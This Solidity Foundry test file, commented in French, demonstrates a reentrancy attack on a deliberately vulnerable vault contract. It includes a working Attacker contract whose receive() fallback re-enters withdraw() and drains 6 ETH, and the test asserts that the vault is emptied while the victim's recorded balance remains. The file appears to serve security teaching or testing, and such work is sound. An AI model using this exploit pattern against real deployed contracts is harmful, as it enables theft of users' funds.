pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

contract Attacker {
    VulnerableVault public vault;
    uint256 public withdrawals;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    function attack() external {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        withdrawals++;

        if (withdrawals < 6) {
            vault.withdraw();
        }
    }
}

contract VulnerableVaultTest is Test {
    VulnerableVault vault;
    Attacker attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new Attacker(vault);

        vm.deal(address(this), 5 ether);
        vm.deal(address(attacker), 1 ether);
    }

    function test_ReentrancyDrainsVault() public {
        // Dépôt de 5 ETH dans le Vault
        vault.deposit{value: 5 ether}();

        // L'attaquant dépose 1 ETH puis attaque
        attacker.attack();

        // L'attaquant récupère 6 ETH
        assertEq(address(attacker).balance, 6 ether);

        // Le Vault est vidé
        assertEq(address(vault).balance, 0);

        // Le solde de la victime reste enregistré
        assertEq(vault.balances(address(this)), 5 ether);
    }
}
